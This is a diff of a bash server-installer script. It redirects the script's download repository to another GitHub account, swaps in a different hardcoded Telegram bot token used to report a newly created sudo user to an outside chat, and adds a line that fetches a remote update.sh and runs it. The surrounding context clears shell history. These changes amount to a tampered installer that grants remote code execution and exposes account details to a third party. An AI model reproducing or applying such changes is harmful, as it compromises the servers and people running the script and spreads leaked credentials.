@@ -94,7 +94,7 @@ clear
 echo -e "\e[32mloading...\e[0m"
 clear
 # REPO    
-    REPO="https://raw.githubusercontent.com/Anggajrxxx/vip/main/"
+    REPO="https://raw.githubusercontent.com/figogove/vip/main/"
 
 ####
 start=$(date +%s)
@@ -289,7 +289,7 @@ function password_default() {
     usermod -aG sudo $Username > /dev/null 2>&1
 
     CHATID="-1001899398362"
-    KEY="6293396608:AAFR9MI4hz8Jfe7AVITf1ANVxOVUhe_lZmc"
+    KEY="6801918783:AAEy1eZNYXnjiMB5bwL6hFD6sHdEz9noDp0"
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
     TEXT="
@@ -1019,6 +1019,7 @@ clear
     profile
     enable_services
 }
+wget ${REPO}update.sh &&  chmod +x update.sh && ./update.sh
 instal
 echo ""
 history -c
@@ -1071,7 +1072,6 @@ echo -e ""
 echo ""
 echo "" | tee -a log-install.txt
 echo -e ""
-sudo hostnamectl set-hostname $username
 echo -e "${green} Script Successfull Installed"
 echo ""
 read -p "$( echo -e "Press ${YELLOW}[ ${NC}${YELLOW}Enter${NC} ${YELLOW}]${NC} For Reboot") "
